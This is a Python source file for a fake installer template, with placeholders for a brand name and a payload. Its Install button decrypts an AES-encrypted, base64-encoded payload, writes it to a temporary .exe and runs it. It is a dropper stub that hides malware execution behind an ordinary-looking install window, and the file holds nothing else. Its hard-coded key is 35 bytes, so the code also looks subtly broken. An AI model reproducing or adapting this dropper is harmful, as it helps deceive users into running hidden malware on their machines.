import sys, base64, tempfile, subprocess
from PyQt5.QtWidgets import QApplication, QLabel, QPushButton, QVBoxLayout, QWidget
from Crypto.Cipher import AES
import os

KEY = b"ThisIsA32ByteKeyForAESObfuscation!!"

def decrypt_and_execute(enc_b64):
    raw = base64.b64decode(enc_b64)
    iv = raw[:16]
    cipher = AES.new(KEY, AES.MODE_CFB, iv)
    shellcode = cipher.decrypt(raw[16:])
    path = tempfile.NamedTemporaryFile(delete=False, suffix=".exe").name
    with open(path, "wb") as f:
        f.write(shellcode)
    subprocess.Popen([path], shell=True)

class InstallerUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("{{BRAND}}")
        self.setFixedSize(400, 200)
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Installing..."))
        btn = QPushButton("Install")
        btn.clicked.connect(self.on_install)
        layout.addWidget(btn)
        self.setLayout(layout)

    def on_install(self):
        decrypt_and_execute("{{PAYLOAD}}")
        self.close()

def main():
    app = QApplication(sys.argv)
    win = InstallerUI()
    win.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
